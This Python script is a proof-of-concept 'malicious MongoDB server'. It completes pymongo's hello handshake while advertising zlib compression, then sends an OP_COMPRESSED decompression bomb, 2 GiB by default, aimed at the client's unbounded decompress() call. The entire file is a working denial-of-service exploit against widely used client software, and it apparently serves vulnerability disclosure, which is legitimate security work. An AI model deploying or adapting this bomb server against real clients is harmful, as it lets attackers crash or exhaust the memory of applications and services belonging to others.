"""
Minimal malicious MongoDB server for demonstrating a decompression-bomb DoS
against pymongo's OP_COMPRESSED handling. pymongo/network_layer.py's
decompress() calls zlib.decompress()/snappy.uncompress()/zstd.decompress()
in one shot with no output-size bound, and the wire-format uncompressedSize
field is parsed but discarded (never checked against any cap).

Handles the initial legacy OP_QUERY-based hello handshake (what pymongo
actually sends first), replies with a hello document advertising zlib
compression, then on the client's next request replies with an
OP_COMPRESSED zlib bomb.
"""
import socket
import struct
import sys
import time
import zlib

import bson

HOST = "127.0.0.1"
PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 27750

OP_REPLY = 1
OP_QUERY = 2004
OP_MSG = 2013
OP_COMPRESSED = 2012


def recv_exact(sock, n):
    buf = b""
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            raise ConnectionError("client closed connection")
        buf += chunk
    return buf


def read_message(sock):
    header = recv_exact(sock, 16)
    length, request_id, response_to, op_code = struct.unpack("<iiii", header)
    body = recv_exact(sock, length - 16)
    return length, request_id, response_to, op_code, body


def make_op_reply(request_id, response_to, doc):
    payload = bson.BSON.encode(doc)
    # responseFlags(4) cursorID(8) startingFrom(4) numberReturned(4)
    body = struct.pack("<iqii", 0, 0, 0, 1) + payload
    length = 16 + len(body)
    header = struct.pack("<iiii", length, request_id, response_to, OP_REPLY)
    return header + body


def make_op_msg_reply(request_id, response_to, doc):
    payload = bson.BSON.encode(doc)
    body = struct.pack("<I", 0) + b"\x00" + payload  # flags=0, kind=0, doc
    length = 16 + len(body)
    header = struct.pack("<iiii", length, request_id, response_to, OP_MSG)
    return header + body


def make_op_compressed_bomb(request_id, response_to, ratio_input_size, original_opcode, precomputed_path=None):
    if precomputed_path:
        with open(precomputed_path, "rb") as f:
            compressed = f.read()
        uncompressed_size = ratio_input_size
    else:
        raw = b"\x00" * ratio_input_size
        compressed = zlib.compress(raw, level=9)
        uncompressed_size = len(raw)
    compressor_id = 2  # zlib
    comp_header = struct.pack("<iiB", original_opcode, uncompressed_size, compressor_id)
    body = comp_header + compressed
    length = 16 + len(body)
    header = struct.pack("<iiii", length, request_id, response_to, OP_COMPRESSED)
    print(
        f"[server] sending OP_COMPRESSED: wire bytes={length} "
        f"compressed_payload={len(compressed)} claimed_uncompressed={uncompressed_size} "
        f"(compression ratio {uncompressed_size/len(compressed):.0f}:1)",
        flush=True,
    )
    return header + body


def main():
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind((HOST, PORT))
    srv.listen(1)
    print(f"[server] listening on {HOST}:{PORT}", flush=True)
    conn, addr = srv.accept()
    print(f"[server] connection from {addr}", flush=True)

    hello_reply = {
        "ismaster": True,
        "maxBsonObjectSize": 16777216,
        "maxMessageSizeBytes": 48000000,
        "maxWriteBatchSize": 100000,
        "localTime": bson.datetime.datetime.now(bson.datetime.timezone.utc),
        "minWireVersion": 0,
        "maxWireVersion": 21,
        "readOnly": False,
        "compression": ["zlib"],
        "helloOk": True,
        "ok": 1.0,
    }

    # --- Step 1: handle initial handshake, whatever opcode it uses ---
    length, request_id, response_to, op_code, body = read_message(conn)
    print(f"[server] handshake request op_code={op_code} len={length}", flush=True)

    if op_code == OP_QUERY:
        conn.sendall(make_op_reply(request_id + 1, request_id, hello_reply))
    elif op_code == OP_MSG:
        conn.sendall(make_op_msg_reply(request_id + 1, request_id, hello_reply))
    else:
        raise RuntimeError(f"unexpected handshake opcode {op_code}")

    # --- Step 2: wait for the client's next command, then fire the bomb ---
    length, request_id, response_to, op_code, body = read_message(conn)
    print(f"[server] got next client request, op_code={op_code}, len={length}", flush=True)

    bomb_size = int(sys.argv[2]) if len(sys.argv) > 2 else 2 * 1024 * 1024 * 1024  # 2 GiB default
    precomputed = sys.argv[3] if len(sys.argv) > 3 else None
    # Reply using whatever opcode the client just used as the "original opcode"
    # inside the OP_COMPRESSED wrapper (matches real server behavior).
    conn.sendall(make_op_compressed_bomb(request_id + 1, request_id, bomb_size, op_code, precomputed))

    print("[server] bomb sent, waiting a bit then closing", flush=True)
    time.sleep(5)
    conn.close()


if __name__ == "__main__":
    main()
